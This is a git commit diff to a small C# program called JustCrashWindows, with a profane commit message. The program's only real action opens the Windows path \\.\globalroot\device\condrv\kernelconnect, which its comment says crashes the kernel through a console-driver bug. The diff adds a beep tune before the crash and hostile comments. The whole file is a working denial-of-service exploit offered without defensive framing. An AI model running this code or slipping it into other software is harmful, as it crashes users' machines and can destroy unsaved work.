49353afb5c547a5c566d373c02b98dd48317e345
RadiantDerg <jayvier13@gmail.com>
2021-01-20 21:19:35 -0600

    I made it worse fuck you

--- src/JustCrashWindows/Program.cs
+++ src/JustCrashWindows/Program.cs
@@ -1,4 +1,6 @@
-﻿using System.IO;
+﻿using System;
+using System.IO;
+using System.Threading;
 
 namespace JustCrashWindows
 {
@@ -7,6 +9,20 @@ namespace JustCrashWindows
         // There is a major bug in condrv that causes a kernel level crash thanks to bad error handling
         // when trying to read from kernelconnect path with improper parameters.
         static void Main()
-            => File.OpenRead(@"\\.\globalroot\device\condrv\kernelconnect");
+        {
+            //Have a bad time
+            Console.Beep(300, 88);
+            Thread.Sleep(32);
+            Console.Beep(300, 88);
+            Thread.Sleep(32);
+            Console.Beep(600, 88);
+            Thread.Sleep(152);
+            Console.Beep(440, 88);
+            Thread.Sleep(272);
+            //Fuck you :)
+            File.OpenRead(@"\\.\globalroot\device\condrv\kernelconnect");
+        }
+
+        
     }
 }
